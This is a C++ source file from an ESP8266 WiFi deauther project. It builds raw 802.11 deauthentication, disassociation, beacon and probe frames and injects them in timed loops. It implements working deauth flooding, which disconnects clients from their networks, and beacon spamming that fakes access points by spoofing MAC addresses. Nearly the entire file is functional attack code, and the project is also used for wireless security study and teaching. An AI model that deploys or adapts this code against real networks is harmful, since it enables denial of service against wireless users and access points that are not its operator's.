/*
   Copyright (c) 2020 Stefan Kremser
   This software is licensed under the MIT License. See the license file for details.
   Source: github.com/spacehuhn/esp8266_deauther
 */

#include "attack.h"

#include "debug.h"
#include "cli.h"
#include "strh.h"

// ========== Packet Injection Functions ========== //
extern "C" {
    #include "user_interface.h"
    typedef void (* freedom_outside_cb_t)(uint8 status);
    int wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);
    void wifi_unregister_send_pkt_freedom_cb(void);
    int wifi_send_pkt_freedom(uint8* buf, int len, bool sys_seq);
}

// ========== DEAUTH ========== //
uint8_t deauth_pkt[] = {
    /*  0 - 1  */ 0xC0, 0x00,                         // Type, subtype: c0 => deauth, a0 => disassociate
    /*  2 - 3  */ 0x00, 0x00,                         // Duration (handled by the SDK)
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Reciever MAC (To)
    /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source MAC (From)
    /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID MAC (From)
    /* 22 - 23 */ 0x00, 0x00,                         // Fragment & squence number
    /* 24 - 25 */ 0x01, 0x00                          // Reason code (1 = unspecified reason)
};

// ========== BEACON ========== //
uint8_t beacon_pkt[] = {
    // [22]
    /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00,                         // Type/Subtype: managment beacon frame
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // Destination MAC
    /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             // Source MAC
    /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             // Source MAC

    // Fixed parameters [14]
    /* 22 - 23 */ 0x00, 0x00,                                     // Fragment & sequence number (handled by the SDK)
    /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
    /* 32 - 33 */ 0xe8, 0x03,                                     // Interval: [0x64, 0x00] => 100ms, [0xe8, 0x03] => 1s
    /* 34 - 35 */ 0x31, 0x00,                                     // Capabilities Tnformation 0x21 = OPEN, 0x31 = ENCRYPTED

    // Tagged parameters

    // SSID parameters [2+ssid]
    /* 36 - 37 */ 0x00, 0x20,             // Tag: Set SSID length, Tag length: 32
    /* 38 -    */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*    - 69 */ 0x00, 0x00, 0x00, 0x00, // SSID

    // Supported Rates [10]
    /* 70 - 71 */ 0x01, 0x08,             // Tag: Supported Rates, Tag length: 8
    /*    72   */ 0x82,                   // 1(B)
    /*    73   */ 0x84,                   // 2(B)
    /*    74   */ 0x8b,                   // 5.5(B)
    /*    75   */ 0x96,                   // 11(B)
    /*    76   */ 0x24,                   // 18
    /*    77   */ 0x30,                   // 24
    /*    78   */ 0x48,                   // 36
    /*    79   */ 0x6c,                   // 54

    // Current Channel [3]
    /* 80 - 81 */ 0x03, 0x01,             // Channel set, length
    /*    82   */ 0x01,                   // Current Channel

    // RSN information
    /* 83 - 84 */ 0x30, 0x18,
    /* 85 - 86 */ 0x01, 0x00,
    /* 87 - 90 */ 0x00, 0x0f, 0xac, 0x02,
    /* 91 - 92 */ 0x02, 0x00,
    /* 93 -100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
    /*101 -102 */ 0x01, 0x00,
    /*103 -106 */ 0x00, 0x0f, 0xac, 0x02,
    /*107 -108 */ 0x00, 0x00
};

uint8_t probe_pkt[] = {
    /*  0 - 1  */ 0x40, 0x00,                         // Type: Probe Request
    /*  2 - 3  */ 0x00, 0x00,                         // Duration: 0 microseconds
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
    /* 10 - 15 */ 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, // Source: random MAC
    /* 16 - 21 */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // BSS Id: Broadcast
    /* 22 - 23 */ 0x00, 0x00,                         // Sequence number (handled by the SDK)
    /* 24 - 25 */ 0x00, 0x20,                         // Tag: Set SSID length, Tag length: 32
    /* 26 -    */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /*    - 57 */ 0x00, 0x00, 0x00, 0x00,             // SSID
    /* 58 - 59 */ 0x01, 0x08,                         // Tag Number: Supported Rates (1), Tag length: 8
    /*    60   */ 0x82,                               // 1(B)
    /*    61   */ 0x84,                               // 2(B)
    /*    62   */ 0x8b,                               // 5.5(B)
    /*    63   */ 0x96,                               // 11(B)
    /*    64   */ 0x24,                               // 18
    /*    65   */ 0x30,                               // 24
    /*    66   */ 0x48,                               // 36
    /*    67   */ 0x6c                                // 54
};

typedef struct deauth_attack_data_t {
    TargetList    targets;
    bool          deauth;
    bool          disassoc;
    unsigned long rate;
    unsigned long timeout;
    unsigned long pkts;
    unsigned long start_time;
    unsigned long output_time;
    unsigned long pkts_sent;
    unsigned long pkts_per_second;
    unsigned long pkt_time;
    unsigned long pkt_interval;
} deauth_attack_data_t;

typedef struct beacon_attack_data_t {
    StringList    ssids;
    uint8_t       from[6];
    uint8_t       to[6];
    int           enc;
    uint8_t       ch;
    unsigned long timeout;
    unsigned long start_time;
    unsigned long output_time;
    unsigned long pkts_sent;
    unsigned long pkts_per_second;
    unsigned long pkt_time;
    unsigned long pkt_interval;
} beacon_attack_data_t;

namespace packetinjector {
    bool send(uint8_t ch, uint8_t* buf, uint16_t len) {
        wifi_set_channel(ch);
        return wifi_send_pkt_freedom(buf, len, 0) == 0;
    }

    bool send_deauth(uint8_t ch, uint8_t* from, uint8_t* to) {
        deauth_pkt[0] = 0xc0;
        memcpy(&deauth_pkt[10], from, 6);
        memcpy(&deauth_pkt[16], from, 6);
        memcpy(&deauth_pkt[4], to, 6);
        return send(ch, deauth_pkt, sizeof(deauth_pkt));
    }

    bool send_disassoc(uint8_t ch, uint8_t* from, uint8_t* to) {
        deauth_pkt[0] = 0xa0;
        memcpy(&deauth_pkt[10], from, 6);
        memcpy(&deauth_pkt[16], from, 6);
        memcpy(&deauth_pkt[4], to, 6);
        return send(ch, deauth_pkt, sizeof(deauth_pkt));
    }

    bool send_beacon(uint8_t ch, uint8_t* from, uint8_t* to, const char* ssid, int enc) {
        size_t ssid_len = strlen(ssid);

        if (ssid_len > 32) ssid_len = 32;
        uint16_t pkt_len = 0;

        uint8_t frame[109];

        // MAC header
        memcpy(&frame[0], &beacon_pkt[0], 4);
        memcpy(&frame[4], to, 6);
        memcpy(&frame[10], from, 6);
        memcpy(&frame[16], from, 6);
        pkt_len += 4 + 6 + 6 + 6;

        // Fixed parameters
        memcpy(&frame[22], &beacon_pkt[22], 14);
        pkt_len += 14;

        // SSID
        frame[pkt_len]   = 0x00;
        frame[pkt_len+1] = ssid_len;
        memcpy(&frame[pkt_len+2], ssid, ssid_len);
        pkt_len += 2 + ssid_len;

        // Supported Rates
        memcpy(&frame[pkt_len], &beacon_pkt[70], 10);
        pkt_len += 10;

        // Channel
        memcpy(&frame[pkt_len], &beacon_pkt[80], 2);
        frame[pkt_len] = ch;
        pkt_len       += 2 + 1;

        // RSN
        switch (enc) {
            case ENCRYPTION_OPEN:
                frame[34] = 0x21;
                return send(ch, frame, pkt_len);
            case ENCRYPTION_WPA2:
                frame[34] = 0x31;

                memcpy(&frame[pkt_len], &beacon_pkt[83], 26);
                pkt_len += 26;

                return send(ch, frame, pkt_len);
            default:
                return false;
        }
    }

    bool send_probe(uint8_t ch, uint8_t* from, const char* ssid) {
        memcpy(&probe_pkt[10], from, 6);
        // probe_pkt[25] = strlen(ssid);
        memset(&probe_pkt[26], 0, 32);
        return send(ch, probe_pkt, sizeof(probe_pkt));
    }
}

namespace attack {
    beacon_attack_data_t beacon_data;
    deauth_attack_data_t deauth_data;

    // ========== Attacks =========== //
    void startBeacon(StringList& ssid_list, uint8_t* from, uint8_t* to, int enc, uint8_t ch, unsigned long timeout) {
        { // Error checks
            if (ssid_list.size() == 0) {
                debugln("ERROR: No SSIDs specified");
                return;
            }

            if (!from || !to) {
                debugln("ERROR: MAC address not specified");
                return;
            }

            if ((ch < 1) || (ch > 14)) {
                debugln("ERROR: Invalid channel");
                return;
            }
        }

        { // Output
            debug("Sending beacons from ");
            debug(strh::mac(from));
            debug(" to ");
            debug(strh::mac(to));
            debug(" on channel ");
            debugln(ch);

            debug("Encryption: ");

            switch (enc) {
                case ENCRYPTION_OPEN:
                    debugln("none");
                    break;
                case ENCRYPTION_WPA2:
                    debugln("WPA2");
                    break;
            }

            debugln("SSIDs:");

            while (ssid_list.available()) {
                debugln(ssid_list.iterate());
            }

            if (timeout > 0) {
                debug("Stop after ");
                debug(timeout/1000);
                debugln(" seconds");
            }
            debugln("Type 'stop' or 'exit' to stop the attack");
        }

        beacon_data.ssids.moveFrom(ssid_list);
        memcpy(beacon_data.from, from, 6);
        memcpy(beacon_data.to, to, 6);
        beacon_data.enc             = enc;
        beacon_data.ch              = ch;
        beacon_data.timeout         = timeout;
        beacon_data.start_time      = millis();
        beacon_data.output_time     = millis();
        beacon_data.pkts_sent       = 0;
        beacon_data.pkts_per_second = 0;
        beacon_data.pkt_time        = millis();
        beacon_data.pkt_interval    = 100;
    }

    void startDeauth(TargetList& targets, bool deauth, bool disassoc, unsigned long rate, unsigned long timeout, unsigned long pkts) {
        { // Error checks
            if (targets.size() == 0) {
                debugln("ERROR: No targets specified");
                return;
            }
            if (!deauth && !disassoc) {
                debugln("ERROR: Invalid mode");
                return;
            }
        }

        { // Output
            if (deauth && disassoc) {
                debug("Deauthing and disassociating ");
            } else if (deauth) {
                debug("Deauthing ");
            } else if (disassoc) {
                debug("Disassociating ");
            }

            debug(targets.size());
            debugln(" targets:");

            // Print MACs
            targets.begin();

            while (targets.available()) {
                Target t = targets.iterate();
                debug("- From ");
                debug(strh::mac(t.from()));
                debug(" to ");
                debug(strh::mac(t.to()));
                debug(" on channel ");
                debugln(t.ch());
            }

            debug("With ");
            debug(rate);
            debugln(" packets per second");

            if (timeout > 0) {
                debug("Stop after ");
                debug(timeout/1000);
                debugln(" seconds");
            }

            if (pkts > 0) {
                debug("Stop after ");
                debug(pkts);
                debugln(" packets");
            }

            debugln("Type 'stop' or 'exit' to stop the attack");
        }

        deauth_data.targets.moveFrom(targets);
        deauth_data.deauth          = deauth;
        deauth_data.disassoc        = disassoc;
        deauth_data.rate            = rate;
        deauth_data.timeout         = timeout;
        deauth_data.pkts            = pkts;
        deauth_data.start_time      = millis();
        deauth_data.output_time     = millis();
        deauth_data.pkts_sent       = 0;
        deauth_data.pkts_per_second = 0;
        deauth_data.pkt_time        = 0;
        deauth_data.pkt_interval    = (1000/rate) * (deauth+disassoc);
    }

    void updateBeacon() {
        beacon_attack_data_t& b = beacon_data;

        if (b.ssids.size() > 0) {
            if (/*cli::read_exit() || */ ((b.timeout > 0) && (millis() - b.start_time > b.timeout))) {
                b.ssids.clear();
                debugln("Beacon attack stopped");
                return;
            }

            if (millis() - b.pkt_time >= b.pkt_interval) {
                b.pkt_time = millis();
                b.ssids.begin();

                uint8_t from[6];
                memcpy(from, b.from, 6);

                uint8_t last_byte = from[5];

                for (int i = 0; i<b.ssids.size(); ++i) {
                    from[5] = last_byte + i;

                    String ssid = b.ssids.iterate();

                    b.pkts_per_second += packetinjector::send_beacon(b.ch, from, b.to, ssid.c_str(), b.enc);
                    delay(1);
                }
            }

            if (millis() - b.output_time >= 1000) {
                b.pkts_sent += b.pkts_per_second;

                debug(b.pkts_per_second);
                debug(" pkts/s, ");
                debug(b.pkts_sent);
                debugln(" sent ");

                b.output_time = millis();

                b.pkts_per_second = 0;
            }
        }
    }

    void updateDeauth() {
        deauth_attack_data_t& d = deauth_data;

        if (d.targets.size() > 0) {
            if ( /*(cli::read_exit()
                 || */
                ((d.timeout > 0) && (millis() - d.start_time > d.timeout))
                || ((d.pkts > 0) && (d.pkts_sent >= d.pkts))) {
                d.targets.clear();
                debugln("Deauth attack stopped");
                return;
            }

            if (millis() - d.output_time >= 1000) {
                d.pkts_sent += d.pkts_per_second;

                debug(d.pkts_per_second);
                debug(" pkts/s, ");
                debug(d.pkts_sent);
                debugln(" sent");

                d.output_time = millis();

                d.pkts_per_second = 0;
            }

            if (millis() - d.pkt_time >= d.pkt_interval) {
                Target t = d.targets.iterate();

                if (d.deauth) d.pkts_per_second += packetinjector::send_deauth(t.ch(), t.from(), t.to());
                if (d.disassoc) d.pkts_per_second += packetinjector::send_disassoc(t.ch(), t.from(), t.to());

                d.pkt_time = millis();
            }

            if (!d.targets.available()) d.targets.begin();
        }
    }

    void update() {
        updateBeacon();
        updateDeauth();
    }
}